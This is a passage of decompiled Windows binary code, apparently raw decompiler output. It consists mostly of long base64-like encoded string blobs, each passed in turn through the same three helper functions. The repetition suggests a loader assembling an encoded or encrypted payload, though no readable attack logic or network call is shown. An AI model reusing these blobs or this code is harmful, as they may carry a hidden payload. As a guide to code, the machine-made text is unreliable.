BQoSIAZi7q4ym2+iqI5Hk7e0dn2/H/ZjB9VhqA6d3XSFthaK/hRxUX2rVMfK/l5nM5jJagz99/8S4yugR9V7HaoJagP963wCWOYMBg0f54Td4ki8MjiD6x/wALPwbiJAGRcge0gv0iyYiCirmntB+ioSTYyK4BX40byxL+J+WFsAFheVihEosSWVJJO1I0GPbDcIEzcyDY1ahzQWTWcOI8J16dOpkEeTgF6W9+wlDKFTnENs7RHqovFK4F5WfndzH7GlSbrkjCX7So5Q8CRF87z3xJooZlo8SdoFcaarRWEcKOIerjhXou0e6O+aCByXzzRJKNHtK+zaoameZyj49mglptTKaHqubSyI1bOLkmPvNWnTClHj8LrnyNNt2FmgdppI7gL63rE7dnZ9A8YAJOszGocPR0EJlYRocdF425YOFEtLVeHuBMSsDyDyVcwDUiDoU0RF3yn+Wk4z0UuXrd3DC9hWOSMYeDPmyC4xtnZa9flrB5akZETrRRulcgfYEJZ1jP79aukP8Q+HnAALDFsAD6L/SJJuc/0VL06KT0wys5iiO4bkpJ6CdJJ20Q8r+3J8pod8ZLKmm3g6M1NudM+eLqmxxhxekAcWYcMkD6pNsEyAD6SFXgD3owJ6VMTzFyaNDlJRlabjeLSHNSAFIBb4UpwmgM71hhZjWgxSgJVr6BhdL8oMcl2YMhBGy4oGzA+KGLZ9RW12f8EGDBwIohggfRdQIfb4VRW5vHfxM09J7kNtkhXw7JIlkkjMSdLHqd56MjPA\"\n    ;\n    puStack244 = &stack0xffffff48;\n    uStack248 = 0x401572;\n    puStack244 = fcn.004028d0();\n    uStack128 = CONCAT31(uStack128._1_3_, 8);\n    pcStack236 = *0x4295b4;\n    uStack240 = NULL;\n    uStack248 = 0x40158c;\n    fcn.004022b0();\n    uStack248 = 1;\n    pcStack140 = pcStack140 & 0xffffff00;\n    pcStack252 = 0x40159b;\n    fcn.004024b0();\n    uStack256 = &stack0xffffff28;\n    pcStack252 = \n    \"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\"\n    ;\n    puStack260 = &stack0xffffff38;\n    uStack264 = 0x4015af;\n    puStack260 = fcn.004028d0();\n    uStack144 = CONCAT31(uStack144._1_3_, 9);\n    pcStack252 = *0x4295b4;\n    uStack256 = NULL;\n    uStack264 = 0x4015c9;\n    fcn.004022b0();\n    uStack264 = 1;\n    pcStack156 = pcStack156 & 0xffffff00;\n    pcStack268 = 0x4015d8;\n    fcn.004024b0();\n    uStack272 = &stack0xffffff18;\n    pcStack268 = \n    \"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\"\n    ;\n    puStack276 = &stack0xffffff28;\n    uStack280 = 0x4015ec;\n    puStack276 = fcn.004028d0();\n    uStack160 = CONCAT31(uStack160._1_3_, 10);\n    pcStack268 = *0x4295b4;\n    uStack272 = NULL;\n    uStack280 = 0x401606;\n    fcn.004022b0();\n    uStack280 = 1;\n    pcStack172 = pcStack172 & 0xffffff00;\n    pcStack284 = 0x401615;\n    fcn.004024b0();\n    uStack288 = &stack0xffffff08;\n    pcStack284 = \n    \"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\"\n    ;\n    puStack292 = &stack0xffffff18;\n    uStack296 = 0x401629;\n    puStack292 = fcn.004028d0();\n    uStack176 = CONCAT31(uStack176._1_3_, 0xb);\n    pcStack284 = *0x4295b4;\n    uStack288 = NULL;\n    uStack296 = 0x401643;\n    fcn.004022b0();\n    uStack296 = 1;\n    pcStack188 = pcStack188 & 0xffffff00;\n    pcStack300 = 0x401652;\n    fcn.004024b0();\n    uStack304 = &stack0xfffffef8;\n    pcStack300 = \n    \"f39FF1ObWA6AzwkHO3Ncgm8VXms3S1fcUVUBikU0v/d6aLM+4uUKiouQD5rEg3v14+XlcGrMQ0NZrL9oRczY+R+hDUMvf12+ejdCN6xtccYLTUW3qh9lgmmyA7iSZ/appbGsWGpC2tjF3NJF+jMFuTmSIgXoXj+33Vk65M2/Wr0obrN3p+4oiZkNrI/eHLSy0j58zk9skWArQkovTeTR8MEtfGLRBq+/J2K3lvVUKNOAHBwPK2bDMt0WoEy3cI9OKuWYNH1oU/nJ5l+If1HEyXxX6fvmZew7Tuj1drVlz6PaMN2wnYzCFYmleDV5Vg39pfeHUPeC2qsz6Dk095EXhJ10zEuROhhJUAJWSgm8B97CyZqAJ54XR7IciOUCBNpIj2rXGKPa7ps5DAqAI3h/By7WUb8ZxXTl70WX7mia8pwkuDDM1G04mQzKYYqIUKIPGmOLe4YMzIkeHC+Mi2m7sPbe5G+dxtRzFnmv0WQplTdSeAyrzEbCgXrmf53LiR41pGWSzcRZjHeQ/bicBepS8atR4jOUWZWCd7sQA0h5TxSg2fJ95cpDo7u59PdFYrIvqkk470nF2ZU2n+iwPhOkVnbbquXtT4TRDY1OZ8rJ0L6fDFxAYtqDBS3xE2Rtu7dles8oaBJZOuWEtfizuJWxzHNwnJ/i0oXy/VYMdJ/Mo1664nhToRixlyizxkGwgC8PglGu0GQvFRi30Mknh7HYaW5fgKrs7wwVhUsPq6SxT/PqVlr+pqA2Qm4Av98WpjeP3fGUiEpYpeWsOKWlI5AlT7iHWHrU6c6y6WbePCy8ILt47N29vaCTZyX2WZ3Y4KNJZ/YKxbFELgY84tjkycDVn+VS0AKT0KTB40vzcGo+tmEntxMHcDa2kHUQ84ATNFFi6e8mHSl7MFGaOnKbkiCszb3R9pUC89aBT52Gt0K/R4leINsDW8eLbXjf6YEt4pap02sZ/mWvEMcQB2bBArUGGUfhS3Y/QOO5+b/1YUMnlEmPoMxXqKWwiUNkJ3KhNmZIq2/AAr8QL8NgalrMlb/MNEmxSntzIu/ewBYIYKwus7a46+2UoXFlJdm3x2/cxmEoI8qb8v8vWkj53u6nm7yreU6jGWTDnzozYCFPkjwJpaysBNJ2dTZdBr6WWle/DQGSjaLo7/f3mm33Jr1QFbZtf1atrSFlRHKhj7DTGURHgih2FfmXzSk9W/pxdeY3B/nrZHzA1idunlpXSOCASgl17fy3ZOAtLkRHAc38r21haZCJZYCY5Rw5l/pMEzHjrMQsslo/yXjDSzM4wSvK8ZhRhKSlgOdsBLxbBDuVM1jP1/6oda1UQDJnwaniP4OZccUpbg+TQjciR+jhrRtVpnsoFlJ5hrAv1F0IqpkP/fFrc/iUihu3k2eUBJPPgf3n3HGwaDUymL1pOcWgC7kyhpbm/W+SH5uosLhHUWKJBSQBJ9OKIjN03OAZDgXzLPvHpxO0DuPEUweUL87xhNN6D31SQ3Y71MnaqWNbNzMArvXYeeRRcYBN+pDuZBejQYFcoLNloF8EnIBAxzvEnZV3cYbgIU0vCrc3qUZ9hZy2yLJzZKUI/h3cNKdDAAjUb8CqO4M03Bb6GRr5HsxR2Iy1jnphuMD31IklEYGdkC+R8t3w8Rv1UxpCIBPVjtmTWhZ2A4ZTP6lza4M3NoTIXmb9bASDyLDww21ISu03pha3qjKbYY5Q+5QZpBoYvBAB82IjR6GkZ2mmxfMnQBhtGPryv5pr9MHZ5FFidKlnusf9+q13m7ll0ccZ7H85rWdxy1O/iVd6mIB7K5I3iJvESPriufIxSnLgw4Owh1M7d0xfg8BFaVR6AI5TZtnQ0U8Y4JGtATFmPOn50Ykrd+O94zDjwlGzkqMBP1u8VZd1tth5VembFjeDzNCmsx3D2IfHQmV1qDvVsWfkOMVpgyhYqSxWJJ9kvgsdkSTnotl5rE8113uS/5/Dr2FCVOsk5zdqol7PNQL5+Ght7k+SkItHczYk\"\n    ;\n    puStack308 = &stack0xffffff08;\n    uStack312 = 0x401666;\n    puStack308 = fcn.004028d0();\n    uStack192 = CONCAT31(uStack192._1_3_, 0xc);\n    pcStack300 = *0x4295b4;\n    uStack304 = NULL;\n    uStack312 = 0x401680;\n    fcn.004022b0();\n    uStack312 = 1;\n    pcStack204 = pcStack204 & 0xffffff00;\n    pcStack316 = 0x40168f;\n    fcn.004024b0();\n    uStack320 = &stack0xfffffee8;\n    pcStack316 = \n    \"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\"\n    ;\n    puStack324 = &stack0xfffffef8;\n    uStack328 = 0x4016a3;\n    puStack324 = fcn.004028d0();\n    uStack208 = CONCAT31(uStack208._1_3_, 0xd);\n    pcStack316 = *0x4295b4;\n    uStack320 = NULL;\n    uStack328 = 0x4016bd;\n    fcn.004022b0();\n    uStack328 = 1;\n    pcStack220 = pcStack220 & 0xffffff00;\n    pcStack332 = 0x4016cc;\n    fcn.004024b0();\n    uStack336 = &stack0xfffffed8;\n    pcStack332 = \n    \"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\"\n    ;\n    puStack340 = &stack0xfffffee8;\n    uStack344 = 0x4016e0;\n    puStack340 = fcn.004028d0();\n    uStack224 = CONCAT31(uStack224._1_3_, 0xe);\n    pcStack332 = *0x4295b4;\n    uStack336 = NULL;\n    uStack344 = 0x4016fa;\n    fcn.004022b0();\n    uStack344 = 1;\n    pcStack236 = pcStack236 & 0xffffff00;\n    pcStack348 = 0x401709;\n    fcn.004024b0();\n    uStack352 = &stack0xfffffec8;\n    pcStack348 = \n    \"iHUZ3VXxhLfIUxsn3NtOvOz5Z9l07+FzEZZfFr2YjNbQn7V71EzLyH6jxJxSzeeb5UpdFjdZqVKM70CO+av0C+f8zI+t2Qj+hut4seT707+7EsBya4saGAiDpGWgXp1KPiuRsw0DGgGOBbtFwVvA/4ghz63PuWIZpgakFTvUwctp+txQqGB54aPRphi3dBCUTENZp7fxWRj9GWMUl88POgbBBn5YPme75RrIL7aeJ+Wu4Bgjdthreqqe5Ngh2jNNLvalqXLWlYzlT5CHw+1U0gIX6X28bzyKPUh9TZ+p8PMHvPvTA2VssP8lOPrxtlzoJANyq3JWKcFumtyY6cbX83lm/lEJSdpdfDzWBSdzi3ndxvcan27Hlc6/f/ThyqArH3frsM8UBxpQ3c9JXvs27HHEG9VHmxgGV9TDnpb/3j3pGrh1XLWbrQ8oCu9eGgQC7MFSjskvutZ4ixRWBvnd98aZT/pv982XUQA0PHrnObrXMfvXapIx65jyX8sE1EAtPAJJKa8KRURXMyg0mriDh9DY/XW79af7QYIqb6i8SmuQUEX5wDKQXCVylbIccAK9qalAOllCIG20E2FejAYgTCIHl31NTGZgt72TKmD6ci5NDYE0b0tKmEQGf2XBfgKM2SHV3tC1wPLV98urA/02lLdv97sj+uLtCgWCIhYnU86PmbI1EdSafb8S1gm2d1Tmf8X7peeEULOkG9yWE2FIPP8VwnjkejwUYTfcMaUjbEke5OYuYOqPjioYRc0H5Z2rr9E7nIsMX0E58bQhQUYkyox3MKC8f561FfNbz8TgNjS07gwt/l8lVH5oYYdag4gY22qOsiVT2GGl1+gj3ZTz7Jsgk3MZUqFzDOAcTz+5KC69rmw856xBdg4bIbk+mFX5SmVe2sudp9KxX0drinLQi6TaDYOc/hvWbnVVidDoju2iFpjbTbO0mE5C70Ds17U/2vxLT2IanlPULlwBvwGk4YZMcbNOrTOSys1HnRp1DbzoBIO8900Julzf70QSuT18fgnZ9BuT+AO/0+qI9T1zbb7VA0zdQ20lj/N/5Ft9CHkUcJ5o7uGeeLwQm/Cjmjnyk1pdg5x1V6wvBxcS2NgDiXq7LwzBB8NOY9+Vz3OTVtRXL974sSJcJ++Nmw/j79GwHrBzn55rEeFsvK0Wr94WhZcs6tgCLh4vmU5PdcIJF